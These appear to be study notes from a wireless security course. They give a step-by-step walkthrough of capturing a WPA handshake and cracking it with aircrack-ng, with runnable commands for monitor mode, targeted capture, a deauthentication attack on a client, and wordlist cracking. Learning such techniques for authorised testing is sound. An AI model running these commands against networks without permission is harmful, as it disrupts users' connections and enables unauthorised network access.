# Set wifi card into monitoring mode

List available wireless network interfaces with `iwconfig`:
![[Pasted image 20240327144009.png]]

Check (and kill) all the processes that could interfere with the wireless card:
```bash
sudo airmon-ng check
sudo airmon-ng check kill
```

![[Pasted image 20240327143545.png]]

Set our wireless network card into monitoring mode, such that we can capture all the traffic:
```bash
sudo airmon-ng start wlan0
```

![[Pasted image 20240327143900.png]]

With `iwconfig` we can see that the interface *wlan0* is now in monitoring mode:
![[Pasted image 20240327144027.png]]

# Enumerate wifi networks

List all available wifi networks:
```bash
sudo airodump-ng wlan0
```

==Didn't work for me. So from here on the screenshots are taken from the course video.==

![[Pasted image 20240328114419.png]]
BSSID: MAC address of the AP
PWR: Power level (the closer to 0 the stronger the signal)
...
ENC: Encryption used
AUTH: WPA type
ESSID: "Name" of the network

Our target network is *TP-Link_0074*.

# Capture network traffic

Capture traffic:
```bash
sudo airodump-ng -c 6 --bssid 50:C7:BF:8A:00:73 -w capture wlan0
```
Args:
`-c`: The channel
`--bssid`: The BSSID
`-w`: capture output file

From the output we can see that there is 1 station attached to the AP:
![[Pasted image 20240328115300.png]]
Our goal is to capture a 4-way handshake.

# Optional: Deauth-attack

We can use a *deauth*-attack to speed up the capture of a 4-way handshake.

Leaving the above command running, open a new terminal and run the attack via the following command:
```bash
sudo aireplay-ng -0 1 -a 50:C7:BF:8A:00:73 -c 3C:F0:11:22:DB:E3 wlan0
```
Args:
`-0`: Deauth-attack
`1`: Number of times to run the attack
`-a`: MAC address of the access point
`-c`: MAC address of the client we want to attack

If the attack is successful, on the first terminal the message "WPA handshake" will appear, which means we were able to capture a handshake between the client and the AP:
![[Pasted image 20240328121527.png]]

>[!Note]
>The deauth-attack is optional. If you run the capture long enough, eventually you will capture a handshake. The deauth-attack is just to speed up the process.

# Cracking the password hash

```bash
sudo aircrack-ng -w wordlist.txt -b 50:C7:BF:8A:00:73 capture.cap
```
Args:
`-w`: The wordlist to use
`-b`: BSSID of the AP

Successfully cracked the hash:
![[Pasted image 20240328122430.png]]

>[!Note]
>As alternative you can also use *hashcat* to crack the password hash.

# Restore network settings

Set wlan0 interface back into managed mode:
```bash
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up
```

Restart NetworkManager:
```bash
sudo systemctl start NetworkManager
```